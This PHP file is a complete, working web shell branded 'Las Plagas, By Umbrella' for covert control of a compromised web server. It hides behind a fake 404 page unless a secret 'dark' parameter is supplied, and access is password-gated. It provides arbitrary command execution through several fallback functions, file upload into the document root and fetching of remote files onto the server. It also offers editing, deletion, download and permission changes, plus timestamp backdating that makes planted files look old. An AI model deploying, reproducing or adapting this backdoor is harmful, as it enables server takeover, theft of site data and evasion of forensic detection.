<?php
if(!isset($_GET['dark'])) {
    http_response_code(404);
    exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}
session_start();
$_PH=base64_decode('JDJ5JDEwJFNWRVBic3NvQi9VSVJ4VWlUNjJlQ3V2M2YuNFNqMkpVbXM2LzFudnVDSzE2VGNsLkFxZmph');
if(isset($_POST['_logout'])){session_destroy();header('Location:?dark');exit;}
if(isset($_POST['_lp_pass'])){
    if(password_verify($_POST['_lp_pass'],$_PH)){$_SESSION['_lp']=1;header('Location:?dark');exit;}
    $_vzynjvk=true;
}
if(empty($_SESSION['_lp'])){
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title><meta charset="UTF-8"><style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f1117;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}
.box{background:#1a1b23;border:1px solid #ff453a44;border-radius:16px;padding:40px;width:340px;box-shadow:0 20px 60px rgba(0,0,0,.5);text-align:center}
.logo{font-size:40px;margin-bottom:8px;filter:hue-rotate(0deg)}
.title{color:#ff453a;font-size:20px;font-weight:700;letter-spacing:3px;font-family:monospace;margin-bottom:4px}
.sub{color:#636366;font-size:11px;letter-spacing:1px;margin-bottom:28px}
input{width:100%;background:#0f1117;border:1px solid #2a2c35;border-radius:8px;color:#f5f5f7;padding:12px 14px;font-size:14px;outline:none;margin-bottom:14px;font-family:inherit}
input:focus{border-color:#ff453a;box-shadow:0 0 0 3px #ff453a33}
button{width:100%;background:#ff453a;color:#fff;border:none;border-radius:8px;padding:12px;font-size:14px;font-weight:600;cursor:pointer;transition:background .2s;font-family:inherit}
button:hover{background:#ff6961}
.err{color:#ff453a;font-size:12px;margin-bottom:12px}
</style></head><body><form class="box" method=post>
<div class="logo">&#9763;</div>
<div class="title">LAS PLAGAS</div>
<div class="sub">By Umbrella</div>';
    if(!empty($_vzynjvk))echo '<div class="err">Invalid password</div>';
    echo '<input type=password name=_lp_pass placeholder="Password" autofocus>
<button type=submit>Sign In</button>
</form></body></html>';
    exit;
}
set_time_limit(0);error_reporting(0);
$ds=@ini_get('disable_functions');$_rnhthth=$ds?"<span class='t-red'>$ds</span>":"<span class='t-green'>NONE</span>";

if(isset($_GET['path'])){$_agdelr=$_GET['path'];}else{$_agdelr=getcwd();}
$_agdelr=str_replace('\\','/',$_agdelr);
if(isset($_GET['d'])){$_agdelr=$_GET['d'];chdir($_agdelr);}

function _ekglev($c){
    $c.=' 2>&1';
    if(function_exists('proc_open')){$p=proc_open($c,[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','r']],$pp);$o=stream_get_contents($pp[1]);proc_close($p);return $o;}
    elseif(function_exists('shell_exec'))return shell_exec($c);
    elseif(function_exists('exec')){exec($c,$o);return implode("\n",$o);}
    elseif(function_exists('system')){ob_start();system($c);return ob_get_clean();}
    elseif(function_exists('passthru')){ob_start();passthru($c);return ob_get_clean();}
    return 'All execution methods disabled';
}
function _psardk($f){$p=@fileperms($f);$i='';
    if(($p&0xC000)==0xC000)$i='s';elseif(($p&0xA000)==0xA000)$i='l';elseif(($p&0x8000)==0x8000)$i='-';elseif(($p&0x6000)==0x6000)$i='b';elseif(($p&0x4000)==0x4000)$i='d';elseif(($p&0x2000)==0x2000)$i='c';elseif(($p&0x1000)==0x1000)$i='p';else $i='u';
    $i.=(($p&0x0100)?'r':'-').(($p&0x0080)?'w':'-').(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
    $i.=(($p&0x0020)?'r':'-').(($p&0x0010)?'w':'-').(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
    $i.=(($p&0x0004)?'r':'-').(($p&0x0002)?'w':'-').(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
    return $i;}
function _bgmzdw($b){$u=['B','KB','MB','GB'];$i=0;while($b>=1024&&$i<3){$b/=1024;$i++;}return round($b,1).' '.$u[$i];}
function _asikes($f){@touch($f,time()-(mt_rand(120,300)*86400));}
function _gzraxd($d){foreach(scandir($d) as $f){if($f==='.'||$f==='..')continue;$p="$d/$f";is_dir($p)?_gzraxd($p):unlink($p);}rmdir($d);}
if(isset($_POST['up_go'])&&isset($_FILES['up_f'])){
    $_ihdze=($_POST['up_dir']=='root'?$_SERVER['DOCUMENT_ROOT']:$_agdelr).'/'.$_FILES['up_f']['name'];
    move_uploaded_file($_FILES['up_f']['tmp_name'],$_ihdze);
    $_fwisny=file_exists($_ihdze)?"<div class='ok'>Uploaded: $_ihdze</div>":"<div class='err'>Upload failed</div>";
}
if(isset($_POST['fetch_go'])&&!empty($_POST['fetch_url'])&&!empty($_POST['fetch_name'])){
    $_ihdze=$_agdelr.'/'.$_POST['fetch_name'];
    @file_put_contents($_ihdze,@file_get_contents($_POST['fetch_url']));
    $_fwisny=file_exists($_ihdze)?"<div class='ok'>Fetched: $_ihdze</div>":"<div class='err'>Fetch failed</div>";
}
if(isset($_POST['new_file'])&&!empty($_POST['nf_name'])){
    $nf=$_agdelr.'/'.$_POST['nf_name'];
    if(!file_exists($nf)){@file_put_contents($nf,'');_asikes($nf);header("Location:?dark&path=".urlencode($_agdelr)."&edit=".urlencode($nf));exit;}
    else $_fwisny="<div class='err'>File exists</div>";
}
if(isset($_POST['new_dir'])&&!empty($_POST['nd_name'])){
    $nd=$_agdelr.'/'.$_POST['nd_name'];
    if(!is_dir($nd)){@mkdir($nd,0755);_asikes($nd);$_fwisny="<div class='ok'>Created: $nd</div>";}
    else $_fwisny="<div class='err'>Folder exists</div>";
}
if(isset($_POST['do_rename'])&&!empty($_POST['rn_new'])){
    $_qbmcoiq=$_POST['rn_path'];$_mfvyyno=dirname($_qbmcoiq).'/'.$_POST['rn_new'];
    $_fwisny=@rename($_qbmcoiq,$_mfvyyno)?"<div class='ok'>Renamed</div>":"<div class='err'>Rename failed</div>";
}
if(isset($_POST['do_chmod'])){
    $_fwisny=@chmod($_POST['ch_path'],octdec($_POST['ch_val']))?"<div class='ok'>Permission changed</div>":"<div class='err'>Chmod failed</div>";
}
if(isset($_POST['do_chdate'])){
    $ts=strtotime($_POST['cd_val']);
    $_fwisny=($ts&&@touch($_POST['cd_path'],$ts,$ts))?"<div class='ok'>Date changed</div>":"<div class='err'>Date change failed</div>";
}
if(isset($_POST['do_save'])){
    $_fwisny=(@file_put_contents($_POST['sv_path'],$_POST['sv_content'])!==false)?"<div class='ok'>Saved</div>":"<div class='err'>Save failed</div>";
}
if(isset($_GET['del'])){
    $dp=$_GET['del'];
    if(is_dir($dp))_gzraxd($dp);else @unlink($dp);
    $_fwisny=!file_exists($dp)?"<div class='ok'>Deleted</div>":"<div class='err'>Delete failed</div>";
}
if(isset($_GET['dl'])&&file_exists($_GET['dl'])){
    header('Content-Type:application/octet-stream');header('Content-Disposition:attachment;filename='.basename($_GET['dl']));
    header('Content-Length:'.filesize($_GET['dl']));readfile($_GET['dl']);exit;
}
if(isset($_POST['do_zip'])){
    $zp=$_POST['z_path'];$zn=$zp.'.zip';
    if(class_exists('ZipArchive')){
        $z=new ZipArchive();$z->open($zn,ZipArchive::CREATE|ZipArchive::OVERWRITE);
        if(is_dir($zp)){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($zp,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);
            foreach($it as $f){$r=substr($f->getPathname(),strlen(realpath($zp))+1);$f->isDir()?$z->addEmptyDir($r):$z->addFile($f->getPathname(),$r);}}
        else $z->addFile($zp,basename($zp));
        $z->close();$_fwisny="<div class='ok'>Zipped: $zn</div>";
    }else $_fwisny="<div class='err'>ZipArchive not available</div>";
}
if(isset($_POST['do_unzip'])){
    $zp=$_POST['z_path'];$_ziiaq=dirname($zp).'/'.pathinfo($zp,PATHINFO_FILENAME);
    if(class_exists('ZipArchive')){$z=new ZipArchive();$z->open($zp);$z->extractTo($_ziiaq);$z->close();$_fwisny="<div class='ok'>Extracted: $_ziiaq</div>";}
    else $_fwisny="<div class='err'>ZipArchive not available</div>";
}
if(isset($_POST['batch_go'])&&!empty($_POST['sel'])){
    $_vndjdex=$_POST['sel'];$ba=$_POST['batch_act'];$bc=0;
    foreach($_vndjdex as $s){
        if($ba=='delete'){if(is_dir($s))_gzraxd($s);else @unlink($s);if(!file_exists($s))$bc++;}
        elseif($ba=='zip'&&class_exists('ZipArchive')){$z=new ZipArchive();$zn=$s.'.zip';$z->open($zn,ZipArchive::CREATE|ZipArchive::OVERWRITE);
            if(is_dir($s)){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $f){$r=substr($f->getPathname(),strlen(realpath($s))+1);$f->isDir()?$z->addEmptyDir($r):$z->addFile($f->getPathname(),$r);}}
            else $z->addFile($s,basename($s));$z->close();$bc++;}
        elseif($ba=='chmod'&&!empty($_POST['batch_chmod'])){@chmod($s,octdec($_POST['batch_chmod']));$bc++;}
        elseif($ba=='olddate'){_asikes($s);$bc++;}
    }
    $_fwisny="<div class='ok'>Batch $ba: $bc items processed</div>";
}
?>
<!DOCTYPE html>
<html><head>
<title>404 Not Found</title>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg1:#0f1117;--bg2:#1a1b23;--bg3:#22242d;--bg4:#2e313d;--accent:#ff453a;--accent2:#ff6961;--adim:#ff453a33;--t1:#f5f5f7;--t2:#98989d;--t3:#636366;--border:#2a2c35;--green:#30d158;--orange:#ff9f0a;--r:10px;--rs:6px}
body{background:var(--bg1);color:var(--t1);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;font-size:13px;line-height:1.5}
.w{max-width:1400px;margin:20px auto;background:var(--bg2);border-radius:12px;border:1px solid var(--border);overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.tb{background:linear-gradient(180deg,#2e313d,#22242d);padding:12px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border)}
.dot{width:12px;height:12px;border-radius:50%}.dr{background:#ff5f57}.dy{background:#febc2e}.dg{background:#28c840}
.tb-t{flex:1;text-align:center;color:var(--accent);font-size:14px;font-weight:700;letter-spacing:2px;text-transform:uppercase}
.tb-sub{text-align:center;color:var(--t3);font-size:10px;font-weight:400;letter-spacing:1px}
.info{padding:12px 16px;background:var(--bg1);border-bottom:1px solid var(--border);font-size:12px;line-height:2}
.info .l{color:var(--t2)}.info .v{color:var(--orange)}
.bc{padding:10px 16px;background:var(--bg2);border-bottom:1px solid var(--border);font-size:13px}
.bc a{color:var(--accent);text-decoration:none}.bc a:hover{color:var(--accent2)}.bc .s{color:var(--t3);margin:0 2px}
.bar{padding:10px 16px;border-bottom:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px;align-items:center;background:var(--bg2)}
a{color:var(--accent);text-decoration:none}a:hover{color:var(--accent2)}
.t-green{color:var(--green);font-weight:600}.t-red{color:var(--accent);font-weight:600}
.pm{color:var(--t2);font-family:'SF Mono',monospace;font-size:12px}.pw{color:var(--green);font-family:'SF Mono',monospace;font-size:12px}.pr{color:var(--accent);font-family:'SF Mono',monospace;font-size:12px}
input[type=text],input[type=number],input[type=password],textarea,select{background:var(--bg1);border:1px solid var(--border);border-radius:var(--rs);color:var(--t1);padding:6px 10px;font-size:13px;font-family:inherit;outline:none}
input[type=text]:focus,textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--adim)}
input[type=file]{color:var(--t2);font-size:12px}
.btn,input[type=submit],input[type=file]::file-selector-button{background:var(--accent);color:#fff;border:none;border-radius:var(--rs);padding:6px 14px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:background .2s}
.btn:hover,input[type=submit]:hover{background:var(--accent2)}
.ghost{background:transparent;color:var(--accent);border:1px solid var(--accent);border-radius:var(--rs);padding:5px 12px;font-size:12px;font-weight:600;cursor:pointer;text-decoration:none;display:inline-block;transition:all .2s}
.ghost:hover{background:var(--accent);color:#fff}
table{width:100%;border-collapse:collapse;table-layout:fixed}
th{background:var(--bg3);color:var(--t2);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;padding:8px 16px;text-align:left;border-bottom:1px solid var(--border)}
td{padding:6px 16px;border-bottom:1px solid #1f2028;font-size:13px;vertical-align:middle}
tr:hover td{background:var(--adim)}
.cmd-out{background:#0a0a0f;color:var(--green);padding:16px;border-radius:var(--r);font-family:'SF Mono','Fira Code',monospace;font-size:12px;line-height:1.6;overflow-x:auto;border:1px solid var(--border);margin:12px 16px;white-space:pre-wrap}
textarea{width:100%;font-family:'SF Mono','Fira Code',monospace;font-size:13px;line-height:1.6;padding:12px;background:#0a0a0f;color:var(--green);border-radius:var(--r);resize:vertical}
.ok{text-align:center;padding:10px;margin:8px 16px;background:#30d15822;border:1px solid #30d15844;border-radius:var(--rs);color:var(--green);font-weight:600}
.err{text-align:center;padding:10px;margin:8px 16px;background:#ff453a22;border:1px solid #ff453a44;border-radius:var(--rs);color:var(--accent);font-weight:600}
.ft{text-align:center;padding:14px;color:var(--t3);font-size:11px;border-top:1px solid var(--border)}
.sc{color:var(--t2);font-size:12px}
.ed{padding:16px}.eh{padding:12px 16px;color:var(--t2);font-size:13px}
.acts{padding:8px 16px;display:flex;gap:6px;flex-wrap:wrap;border-bottom:1px solid var(--border)}
.radio label{color:var(--t2);font-size:12px;margin-right:12px}
.radio input[type=radio]{accent-color:var(--accent)}
form{display:inline}
.sep{color:var(--t3)}
@media(max-width:768px){.w{margin:0;border-radius:0}td,th{padding:6px 8px;font-size:12px}}
</style>
</head><body>
<div class="w">
<div class="tb">
    <div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div>
    <div style="flex:1;text-align:center"><div class="tb-t">Las Plagas</div><div class="tb-sub">By Umbrella</div></div>
    <form method=post><button name="_logout" value=1 class="btn" style="font-size:11px;padding:5px 12px">Logout</button></form>
</div>

<div class="info">
<span class="l">Server:</span> <span class="v"><?=@$_SERVER['SERVER_SOFTWARE']?></span> &bull;
<span class="l">System:</span> <span class="v"><?=php_uname()?></span><br>
<span class="l">User:</span> <span class="v"><?=@get_current_user()?></span> (<?=@getmyuid()?>) &bull;
<span class="l">PHP:</span> <span class="v"><?=phpversion()?></span> &bull;
<span class="l">IP:</span> <span class="v"><?=$_SERVER['SERVER_ADDR']?></span> | <span class="v"><?=$_SERVER['REMOTE_ADDR']?></span><br>
<span class="l">Disabled:</span> <?=$_rnhthth?>
</div>

<div class="bc">
<?php
$_mzzygnu=explode('/',$_agdelr);
foreach($_mzzygnu as $id=>$p){
    if($p==''&&$id==0){echo '<a href="?dark&path=/">/</a>';continue;}
    if($p=='')continue;
    $_gxzz='';for($i=0;$i<=$id;$i++){$_gxzz.=$_mzzygnu[$i];if($i!=$id)$_gxzz.='/';}
    echo '<a href="?dark&path='.urlencode($_gxzz).'">'.$p.'</a><span class="s">/</span>';
}
?>
</div>

<?=@$_fwisny?>

<div class="bar">
<form method=post enctype="multipart/form-data">
    <div class="radio"><label><input type=radio name=up_dir value=cwd checked> cwd</label><label><input type=radio name=up_dir value=root> doc_root</label></div>
    <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap;align-items:center">
    <input type=file name=up_f><input type=submit name=up_go value="Upload">
    <span class="sep">|</span>
    <input type=text name=fetch_url placeholder="https:
    <input type=text name=fetch_name placeholder="filename" style="width:100px">
    <input type=submit name=fetch_go value="Fetch">
    </div>
</form>
</div>

<div class="bar">
<a href="?dark&path=<?=urlencode($_agdelr)?>&term=1" class="ghost" style="padding:5px 10px" title="Ctrl+Enter">Terminal</a>
<span class="sep">|</span>
<form method=post>
    <input type=text name=nf_name placeholder="newfile.php" style="width:120px">
    <input type=submit name=new_file value="+ File" class="ghost" style="padding:5px 10px">
</form>
<form method=post>
    <input type=text name=nd_name placeholder="newfolder" style="width:110px">
    <input type=submit name=new_dir value="+ Dir" class="ghost" style="padding:5px 10px">
</form>
<span class="sep">|</span>
<a href="?dark" class="ghost" style="background:var(--bg3);border-color:var(--border);color:var(--t1)">Home</a>
</div>

<div>
<?php

if(isset($_GET['term'])){
    $_xoibd='';
    if(isset($_POST['cmd_go'])&&!empty($_POST['cmd_text'])) $_xoibd=_ekglev($_POST['cmd_text']);
    echo '<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:99;display:flex;align-items:center;justify-content:center">';
    echo '<div style="width:90%;max-width:1200px;background:var(--bg2);border:1px solid var(--border);border-radius:12px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.7)">';
    echo '<div style="background:var(--bg3);padding:10px 16px;display:flex;align-items:center;border-bottom:1px solid var(--border)">';
    echo '<div class="dot dr" style="width:10px;height:10px"></div><div class="dot dy" style="width:10px;height:10px;margin-left:6px"></div><div class="dot dg" style="width:10px;height:10px;margin-left:6px"></div>';
    echo '<span style="flex:1;text-align:center;color:var(--t2);font-size:12px;font-weight:600">Terminal &mdash; '.htmlspecialchars(@get_current_user()).'@'.htmlspecialchars($_SERVER['SERVER_ADDR']??'localhost').'</span>';
    echo '<a href="?dark&path='.urlencode($_agdelr).'" style="color:var(--t2);font-size:18px;text-decoration:none;padding:0 4px">&times;</a>';
    echo '</div>';
    echo '<div style="padding:12px">';
    echo '<pre class="cmd-out" style="margin:0;min-height:300px;max-height:60vh;overflow-y:auto">'.($_xoibd?htmlspecialchars($_xoibd):'').htmlspecialchars(@get_current_user().'@'.gethostname().':'.$_agdelr.'$ ').'</pre>';
    echo '<form method=post style="display:flex;gap:8px;margin-top:10px">';
    echo '<span style="color:var(--green);font-size:13px;padding:6px 0">$</span>';
    echo '<input type=text name=cmd_text value="" style="flex:1;font-family:monospace" placeholder="Enter command..." autofocus>';
    echo '<input type=submit name=cmd_go value="Run">';
    echo '</form>';
    echo '<div style="margin-top:8px;font-size:10px;color:var(--t3)">Ctrl+Enter: Run &bull; Escape: Close &bull; Ctrl+S: Save (editor)</div>';
    echo '</div></div></div>';
}
if(isset($_GET['edit'])){
    $ef=$_GET['edit'];
    $_ctcua=file_exists($ef)?date('Y-m-d H:i:s',filemtime($ef)):'';
    $_uunru=file_exists($ef)?filesize($ef):0;
    echo '<div class="eh">'.htmlspecialchars($ef).' <span class="sc">('.number_format($_uunru).' bytes &bull; '.$_ctcua.')</span></div>';
    echo '<div class="ed"><form method=post><textarea name=sv_content rows=28>'.htmlspecialchars(@file_get_contents($ef)).'</textarea><br><br>';
    echo '<center><input type=hidden name=sv_path value="'.htmlspecialchars($ef).'"><input type=submit name=do_save value="Save"> &nbsp;';
    echo '<a href="?dark&path='.urlencode(dirname($ef)).'" class="ghost">Close</a></center></form></div>';
    echo '<div class="ft">Las Plagas &mdash; By Umbrella</div></div></body></html>';exit;
}
if(isset($_GET['view'])){
    $vf=$_GET['view'];$_pfnlews=dirname($vf);
    $_xqjympc=file_exists($vf)?date('Y-m-d H:i:s',filemtime($vf)):'';
    $_dumzxve=file_exists($vf)?filesize($vf):0;
    echo '<div class="eh">'.htmlspecialchars($vf).' <span class="sc">('._bgmzdw($_dumzxve).' &bull; '.$_xqjympc.')</span></div>';
    echo '<div class="acts">';
    echo '<a href="?dark&path='.urlencode($_pfnlews).'&edit='.urlencode($vf).'" class="ghost">Edit</a>';
    echo '<a href="?dark&path='.urlencode($_pfnlews).'&ren='.urlencode($vf).'" class="ghost">Rename</a>';
    echo '<a href="?dark&path='.urlencode($_pfnlews).'&chdate='.urlencode($vf).'" class="ghost">Change Date</a>';
    echo '<a href="?dark&path='.urlencode($_pfnlews).'&chm='.urlencode($vf).'" class="ghost">Chmod</a>';
    echo '<a href="?dark&path='.urlencode($_pfnlews).'&dl='.urlencode($vf).'" class="ghost">Download</a>';
    $_spojrl=pathinfo($vf,PATHINFO_EXTENSION);
    if($_spojrl==='zip')echo '<form method=post><input type=hidden name=z_path value="'.htmlspecialchars($vf).'"><input type=submit name=do_unzip value="Unzip" class="ghost"></form>';
    else echo '<form method=post><input type=hidden name=z_path value="'.htmlspecialchars($vf).'"><input type=submit name=do_zip value="Zip" class="ghost"></form>';
    echo '<a href="?dark&del='.urlencode($vf).'&path='.urlencode($_pfnlews).'" class="ghost" style="border-color:#ff453a88" onclick="return confirm(\'Delete?\')">Delete</a>';
    echo '<a href="?dark&path='.urlencode($_pfnlews).'" class="ghost" style="margin-left:auto">Close</a>';
    echo '</div>';
    echo '<pre class="cmd-out">'.htmlspecialchars(@file_get_contents($vf)).'</pre>';
    echo '<div class="ft">Las Plagas &mdash; By Umbrella</div></div></body></html>';exit;
}
if(isset($_GET['ren'])){
    $rf=$_GET['ren'];
    echo '<div class="ed"><center>'.htmlspecialchars($rf).'<br><br>';
    echo '<form method=post><input type=text name=rn_new value="'.htmlspecialchars(basename($rf)).'" style="width:250px"><input type=hidden name=rn_path value="'.htmlspecialchars($rf).'">';
    echo ' <input type=submit name=do_rename value="Rename"></form><br>';
    echo '<a href="?dark&path='.urlencode(dirname($rf)).'&view='.urlencode($rf).'" class="ghost">Cancel</a></center></div>';
    echo '<div class="ft">Las Plagas &mdash; By Umbrella</div></div></body></html>';exit;
}
if(isset($_GET['chdate'])){
    $cf=$_GET['chdate'];$cd=file_exists($cf)?date('Y-m-d H:i:s',filemtime($cf)):'';
    echo '<div class="ed"><center>'.htmlspecialchars($cf).'<br><br>';
    echo '<form method=post><input type=text name=cd_val value="'.$cd.'" style="width:200px" placeholder="2024-01-15 08:30:00"><input type=hidden name=cd_path value="'.htmlspecialchars($cf).'">';
    echo ' <input type=submit name=do_chdate value="Change"></form><br>';
    echo '<a href="?dark&path='.urlencode(dirname($cf)).'&view='.urlencode($cf).'" class="ghost">Cancel</a></center></div>';
    echo '<div class="ft">Las Plagas &mdash; By Umbrella</div></div></body></html>';exit;
}
if(isset($_GET['chm'])){
    $cf=$_GET['chm'];$cp=substr(sprintf('%o',fileperms($cf)),-4);
    echo '<div class="ed"><center>'.htmlspecialchars($cf).'<br><br>';
    echo '<form method=post><input type=text name=ch_val value="'.$cp.'" style="width:80px"><input type=hidden name=ch_path value="'.htmlspecialchars($cf).'">';
    echo ' <input type=submit name=do_chmod value="Change"></form><br>';
    echo '<a href="?dark&path='.urlencode(dirname($cf)).'" class="ghost">Cancel</a></center></div>';
    echo '<div class="ft">Las Plagas &mdash; By Umbrella</div></div></body></html>';exit;
}
$_hengi=@scandir($_agdelr);
echo '<form method=post>';
echo '<table><tr><th style="width:3%"><input type=checkbox onclick="document.querySelectorAll(\'.sel\').forEach(c=>c.checked=this.checked)"></th><th style="width:32%">Name</th><th style="width:10%">Size</th><th style="width:16%">Modified</th><th style="width:15%">Permission</th><th style="width:24%">Action</th></tr>';

if($_hengi)foreach($_hengi as $_jpkacr){
    if($_jpkacr==='.'||$_jpkacr==='..')continue;
    $fp=$_agdelr.'/'.$_jpkacr;
    if(is_dir($fp)){
        $pm=_psardk($fp);$_wnxwcbx=is_writable($fp)?'pw':(is_readable($fp)?'pm':'pr');
        $mt=date('Y-m-d H:i',@filemtime($fp));
        echo "<tr><td><input type=checkbox name='sel[]' value='".htmlspecialchars($fp)."' class=sel></td>";
        echo "<td>&#128193; <a href='?dark&path=".urlencode($fp)."'>$_jpkacr</a></td><td class='sc'>&mdash;</td><td class='sc'><a href='#' onclick='chdt(this)' data-p='".htmlspecialchars($fp)."' data-d='$mt' style='color:var(--t2);border-bottom:1px dashed var(--t3)'>$mt</a></td><td><span class='$_wnxwcbx'>$pm</span></td>";
        echo "<td><a href='?dark&del=".urlencode($fp)."&path=".urlencode($_agdelr)."' class='ghost' style='font-size:10px;padding:3px 8px' onclick=\"return confirm('Delete?')\">del</a> ";
        echo "<a href='?dark&path=".urlencode($_agdelr)."&chm=".urlencode($fp)."' class='ghost' style='font-size:10px;padding:3px 8px'>chmod</a> ";
        echo "<form method=post style='display:inline'><input type=hidden name=z_path value='".htmlspecialchars($fp)."'><input type=submit name=do_zip value='zip' class='ghost' style='font-size:10px;padding:3px 8px'></form></td></tr>";
    }
}
if($_hengi)foreach($_hengi as $_jpkacr){
    if($_jpkacr==='.'||$_jpkacr==='..')continue;
    $fp=$_agdelr.'/'.$_jpkacr;
    if(is_file($fp)){
        $pm=_psardk($fp);$_wnxwcbx=is_writable($fp)?'pw':(is_readable($fp)?'pm':'pr');
        $mt=date('Y-m-d H:i',@filemtime($fp));$sz=_bgmzdw(filesize($fp));
        echo "<tr><td><input type=checkbox name='sel[]' value='".htmlspecialchars($fp)."' class=sel></td>";
        echo "<td>&#128196; <a href='?dark&path=".urlencode($_agdelr)."&view=".urlencode($fp)."'>$_jpkacr</a></td><td class='sc'>$sz</td><td class='sc'><a href='#' onclick='chdt(this)' data-p='".htmlspecialchars($fp)."' data-d='$mt' style='color:var(--t2);border-bottom:1px dashed var(--t3)'>$mt</a></td><td><span class='$_wnxwcbx'>$pm</span></td>";
        echo "<td><a href='?dark&path=".urlencode($_agdelr)."&edit=".urlencode($fp)."' class='ghost' style='font-size:10px;padding:3px 8px'>edit</a> ";
        echo "<a href='?dark&dl=".urlencode($fp)."' class='ghost' style='font-size:10px;padding:3px 8px'>dl</a> ";
        echo "<a href='?dark&del=".urlencode($fp)."&path=".urlencode($_agdelr)."' class='ghost' style='font-size:10px;padding:3px 8px;border-color:#ff453a88' onclick=\"return confirm('Delete?')\">del</a> ";
        echo "<a href='?dark&path=".urlencode($_agdelr)."&chm=".urlencode($fp)."' class='ghost' style='font-size:10px;padding:3px 8px'>chmod</a> ";
        $_spojrl=pathinfo($fp,PATHINFO_EXTENSION);
        if($_spojrl==='zip')echo "<form method=post style='display:inline'><input type=hidden name=z_path value='".htmlspecialchars($fp)."'><input type=submit name=do_unzip value='unzip' class='ghost' style='font-size:10px;padding:3px 8px'></form>";
        else echo "<form method=post style='display:inline'><input type=hidden name=z_path value='".htmlspecialchars($fp)."'><input type=submit name=do_zip value='zip' class='ghost' style='font-size:10px;padding:3px 8px'></form>";
        echo "</td></tr>";
    }
}
echo '</table>';
echo '<div class="bar" style="gap:8px">';
echo '<select name=batch_act style="padding:5px 8px"><option value=delete>Delete Selected</option><option value=zip>Zip Selected</option><option value=chmod>Chmod Selected</option><option value=olddate>Old Date Selected</option></select>';
echo '<input type=text name=batch_chmod placeholder="0755" style="width:60px">';
echo '<input type=submit name=batch_go value="Apply" class="btn" onclick="return confirm(\'Apply to selected?\')">';
echo '</div></form>';
?>
</div>
<div class="ft">Las Plagas &mdash; By Umbrella</div>
</div>
<script>
function chdt(el){var d=prompt('New date (YYYY-MM-DD HH:MM:SS):',el.dataset.d);if(d){var f=document.createElement('form');f.method='post';f.style.display='none';var i1=document.createElement('input');i1.name='cd_val';i1.value=d;var i2=document.createElement('input');i2.name='cd_path';i2.value=el.dataset.p;var i3=document.createElement('input');i3.name='do_chdate';i3.value='1';f.appendChild(i1);f.appendChild(i2);f.appendChild(i3);document.body.appendChild(f);f.submit();}}
document.addEventListener('keydown',function(e){
if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();var b=document.querySelector('input[name=do_save]');if(b)b.click();}
if((e.ctrlKey||e.metaKey)&&e.key==='Enter'){e.preventDefault();var r=document.querySelector('input[name=cmd_go]');if(r)r.click();else window.location.href='?dark&path='+encodeURIComponent('<?=$_agdelr?>')+'&term=1';}
if(e.key==='Escape'){var links=document.querySelectorAll('a.ghost');for(var i=0;i<links.length;i++){if(links[i].textContent==='Close'||links[i].textContent==='Cancel'){links[i].click();break;}}}
});
</script>
</body></html>
